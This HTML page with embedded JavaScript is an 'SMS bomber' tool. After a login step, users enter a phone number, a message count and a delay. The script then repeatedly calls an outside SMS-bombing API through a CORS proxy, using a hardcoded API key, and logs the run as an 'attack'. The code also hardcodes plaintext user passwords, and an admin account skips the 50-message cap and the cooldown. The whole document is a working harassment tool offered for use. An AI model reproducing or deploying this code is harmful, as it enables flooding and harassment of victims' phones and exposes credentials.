<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DA-BEHNCI SMS BOMVACLATTER</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #1a1a1a;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      overflow: hidden;
      transform: scale(0.8); /* Scale down to 80% */
      transform-origin: top; /* Keep the top of the page fixed */
    }
    .card {
      background: #2c2c2c;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 20px #d000ff;
      text-align: center;
      width: 90%;
      max-width: 400px;
      margin-bottom: 20px;
    }
    input {
      display: block;
      margin: 12px auto;
      padding: 12px;
      width: 90%;
      background: #3d3d3d;
      border: 1px solid #d000ff;
      border-radius: 6px;
      color: #ffffff;
      font-size: 16px;
      font-weight: bold;
    }
    button {
      padding: 10px 20px;
      background: #d000ff;
      border: none;
      color: #ffffff;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
      width: 90%;
      box-shadow: 0 0 10px #d000ff;
    }
    button:hover {
      background: #9d00c6;
    }
    .log {
      margin-top: 20px;
      height: 200px;
      overflow-y: auto;
      background: #000e1c;
      border-radius: 6px;
      padding: 10px;
      text-align: left;
      font-size: 14px;
      border: 1px solid #d000ff;
    }
    .log-entry {
      margin: 4px 0;
      font-family: monospace;
      color: #b76aff;
      font-weight: bold;
    }
    .certified-link {
      position: absolute;
      bottom: 12px;
      right: 14px;
      color: #d000ff;
      cursor: pointer;
      font-size: 13px;
      text-decoration: underline;
      font-weight: bold;
    }
    .timer {
      margin-top: 10px;
      font-size: 15px;
      color: #d000ff;
      font-weight: bold;
    }
    h1, h2 {
      margin-top: 0;
      font-weight: bold;
    }
    #loginMessage {
      margin-top: 10px;
      font-size: 13px;
      color: #ff66ff;
      font-weight: bold;
    }
    .admin-buttons {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0, 0, 0, 0.7);
      padding-top: 60px;
    }
    .modal-content {
      background-color: #2c2c2c;
      margin: 5% auto;
      padding: 20px;
      border: 1px solid #d000ff;
      width: 80%;
      max-width: 300px;
      border-radius: 10px;
      text-align: center;
    }
    .modal-button {
      background: #d000ff;
      border: none;
      color: white;
      padding: 10px 20px;
      margin: 5px;
      border-radius: 5px;
      cursor: pointer;
      box-shadow: 0 0 10px #d000ff;
    }
    .modal-button:hover {
      background: #9d00c6;
    }
  </style>
</head>
<body>
  <div id="login-section" class="card">
    <h2>Login</h2>
    <input type="text" id="username" placeholder="üë§ Name" />
    <div style="position: relative;">
      <input type="password" id="password" placeholder="üîí Password" />
      <span onclick="togglePassword()" style="position: absolute; right: 25px; top: 14px; cursor: pointer; color: #d000ff;">üëÅÔ∏è</span>
    </div>
    <button onclick="login()">Login</button>
    <div id="loginMessage" class="log-entry"></div>
    <div class="certified-link" onclick="showValidUsers()">üîé Valid Users</div>
  </div>

  <div id="main-section" class="card" style="display: none;">
    <h1>DA-BEHNCI SMS BOMVACLATTER</h1>
    <input id="number" placeholder="üì± Phone Number" />
    <input id="count" type="number" placeholder="üîÅ How many messages?" />
    <input id="delay" type="number" placeholder="‚è±Ô∏è Delay (seconds)" />
    <div class="admin-buttons">
      <button onclick="startSimulation()">START</button>
      <button onclick="saveLogs()" style="display: none;" id="saveLogsButton">Save Logs</button>
    </div>
    <div class="timer" id="timerDisplay"></div>
    <div class="log" id="logBox"></div>
  </div>

  <!-- Modal -->
  <div id="leaveModal" class="modal">
    <div class="modal-content">
      <h3>Do you want to leave?</h3>
      <button class="modal-button" id="leaveButton">Leave</button>
      <button class="modal-button" id="continueButton">Continue</button>
    </div>
  </div>

  <script>
    const certifiedUsers = [
      { name: "Admin", pass: "Bomva" },
      { name: "Dave", pass: "Gwapo" },
      { name: "Aaron", pass: "Madamba" },
      { name: "Johnsen", pass: "2Pak" },
      { name: "Jaco", pass: "Bowlrat" },
      { name: "Kajo", pass: "Goodjao" },
      { name: "Sam", pass: "Stick-O" },
      { name: "Ivan", pass: "Aeta" },
      { name: "Brix", pass: "Bantor" },
      { name: "Julliana", pass: "Jul2301" },
      { name: "Angel", pass: "Ang0102" },
      { name: "Janelle", pass: "Jan9911" },
      { name: "Sky", pass: "Sky822" },
      { name: "Pauline", pass: "Pau1717" },
      { name: "Julieane", pass: "Jul821" },
      { name: "Mac", pass: "Mac0303" },
      { name: "Cris", pass: "Cris090" },
      { name: "Kiana", pass: "Kia555" },
      { name: "Ericka", pass: "Eri333" },
      { name: "Keith", pass: "Kei888" },
      { name: "Frances", pass: "Fra111" },
      { name: "Tristan", pass: "Tri942" },
      { name: "Mielle", pass: "Mie707" },
      { name: "Joervin", pass: "Joe291" },
      { name: "Vienne", pass: "Vie141" },
      { name: "Jewel", pass: "Jew601" }
    ];

    let currentUser   = "";
    let cooldownActive = false;
    let cooldownTimer;
    let remainingCooldownTime = 0;
    let isAttacking = false;
    let logs = [];

    function togglePassword() {
      const pw = document.getElementById("password");
      pw.type = pw.type === "password" ? "text" : "password";
    }

    function login() {
      const inputName = document.getElementById("username").value.trim();
      const inputPass = document.getElementById("password").value.trim();
      const loginMessage = document.getElementById("loginMessage");

      const found = certifiedUsers.find(
        u => u.name.toLowerCase() === inputName.toLowerCase() && u.pass === inputPass
      );

      if (!found) {
        loginMessage.textContent = "‚ùå Invalid credentials.";
        return;
      }

      loginMessage.textContent = "";
      currentUser   = found.name;
      document.getElementById("login-section").style.display = "none";
      document.getElementById("main-section").style.display = "block";
      logAction(`${currentUser  } logged in.`);

      if (cooldownActive && currentUser   !== "Admin") {
        displayCooldownMessage();
      }

      if (currentUser   === "Admin") {
        document.getElementById("saveLogsButton").style.display = "block";
      }
    }

    function showValidUsers() {
      const visibleUsers = certifiedUsers.filter(u => u.name !== "Admin").map(u => u.name);
      const existing = document.getElementById("validUsersPopup");
      if (existing) return existing.remove();

      const popup = document.createElement("div");
      popup.id = "validUsersPopup";
      Object.assign(popup.style, {
        position: "fixed",
        top: "20px",
        right: "20px",
        background: "#2c2c2c",
        color: "#d000ff",
        padding: "15px",
        borderRadius: "10px",
        border: "1px solid #d000ff",
        boxShadow: "0 0 10px #d000ff",
        maxHeight: "300px",
        overflowY: "auto",
        zIndex: "9999",
        width: "220px"
      });

      const closeBtn = document.createElement("div");
      closeBtn.textContent = "‚úñ";
      Object.assign(closeBtn.style, {
        position: "absolute",
        top: "5px",
        right: "10px",
        cursor: "pointer",
        fontWeight: "bold",
        color: "#ff66ff"
      });
      closeBtn.onclick = () => popup.remove();

      const title = document.createElement("div");
      title.textContent = "üìú Valid Users";
      title.style.fontWeight = "bold";
      title.style.marginBottom = "10px";

      popup.appendChild(closeBtn);
      popup.appendChild(title);
      visibleUsers.forEach(user => {
        const userLine = document.createElement("div");
        userLine.textContent = "‚Ä¢ " + user;
        popup.appendChild(userLine);
      });

      document.body.appendChild(popup);
    }

    function startSimulation() {
      let number = document.getElementById("number").value.trim();
      const count = parseInt(document.getElementById("count").value.trim());
      const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;
      const logBox = document.getElementById("logBox");
      const timerDisplay = document.getElementById("timerDisplay");

      if (number.length === 10 && number.startsWith("9")) {
        number = "0" + number;
        document.getElementById("number").value = number;
      }

      if (!/^09\d{9}$/.test(number) || isNaN(count) || count <= 0 || isNaN(delay)) {
        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>‚ö†Ô∏è Invalid phone number, count, or delay.</div>";
        return;
      }

      // Remove the message limit for Admin
      if (currentUser   !== "Admin" && count > 50) {
        logBox.innerHTML = "<div class='log-entry' style='color: orange;'>‚ö†Ô∏è Maximum number of messages is 50.</div>";
        return;
      }

      logBox.innerHTML = "";
      timerDisplay.textContent = "üöÄ Starting Attack...";
      isAttacking = true;

      let completed = 0;

      for (let i = 1; i <= count; i++) {
        setTimeout(() => {
          // Remove cooldown for Admin
          if (cooldownActive && currentUser   !== "Admin") {
            logBox.innerHTML += "<div class='log-entry' style='color: orange;'>‚ö†Ô∏è Cooldown active. Please wait.</div>";
            return;
          }

          const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8`;

          fetch(url)
            .then(res => res.json())
            .then(data => {
              const result = data.message || "SMS bombing completed.";
              const log = document.createElement("div");
              log.className = "log-entry";
              log.textContent = `${i.toString().padStart(2, '0')} ‚úÖ Sent to ${number}: ${result}`;
              logBox.appendChild(log);
              logBox.scrollTop = logBox.scrollHeight;
              logAction(`${currentUser  } sent ${count} SMS to ${number}.`);

              completed++;
              if (completed === count) {
                timerDisplay.textContent = "‚úÖ Attack Finished.";
                isAttacking = false;
              }

              // Set cooldown for non-admin users
              if (currentUser   !== "Admin") {
                cooldownActive = true;
                remainingCooldownTime = 180;
                displayCooldownMessage();
              }
            })
            .catch(error => {
              const log = document.createElement("div");
              log.className = "log-entry";
              log.style.color = "red";
              log.textContent = `${i.toString().padStart(2, '0')} ‚ùå Error: ${error.message}`;
              logBox.appendChild(log);
              logBox.scrollTop = logBox.scrollHeight;

              completed++;
              if (completed === count) {
                timerDisplay.textContent = "‚úÖ Attack Finished.";
                isAttacking = false;
              }
            });
        }, i * delay * 1000);
      }
    }

    function displayCooldownMessage() {
      const logBox = document.getElementById("logBox");
      const cooldownDisplay = document.createElement("div");
      cooldownDisplay.className = "log-entry";
      cooldownDisplay.style.color = "orange";
      cooldownDisplay.textContent = `Cooldown active for ${remainingCooldownTime} seconds.`;
      logBox.appendChild(cooldownDisplay);
      logBox.scrollTop = logBox.scrollHeight;

      if (remainingCooldownTime > 0) {
        cooldownTimer = setInterval(() => {
          remainingCooldownTime--;
          cooldownDisplay.textContent = `Cooldown active for ${remainingCooldownTime} seconds.`;
          if (remainingCooldownTime <= 0) {
            clearInterval(cooldownTimer);
            cooldownActive = false;
            cooldownDisplay.textContent = "Cooldown finished. You can send messages now.";
          }
        }, 1000);
      }
    }

    function logAction(action) {
      const now = new Date();
      const timestamp = now.toLocaleString();
      logs.push(`${timestamp}: ${action}`);
    }

    function saveLogs() {
      const now = new Date();
      const filename = `${now.getDate()}-${now.getMonth() + 1}-${now.getFullYear()} [${now.getHours()}:${now.getMinutes()}].txt`;
      const blob = new Blob([logs.join('\n')], { type: 'text/plain' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = filename;
      link.click();
      logs = [];
      alert("Logs saved successfully!");
    }

    window.onbeforeunload = function () {
      if (isAttacking) {
        showLeaveModal();
        return false;
      }
    };

    function showLeaveModal() {
      const modal = document.getElementById("leaveModal");
      modal.style.display = "block";

      document.getElementById("leaveButton").onclick = function () {
        alert("Leaving right now will suspend your account for 1 day. Please contact the admin to unsuspend.");
        window.location.href = "login.html";
      };

      document.getElementById("continueButton").onclick = function () {
        modal.style.display = "none";
      };
    }

    document.getElementById("main-section").addEventListener("click", function (event) {
      if (event.target === this) {
        showLeaveModal();
      }
    });
  </script>
</body>
</html>
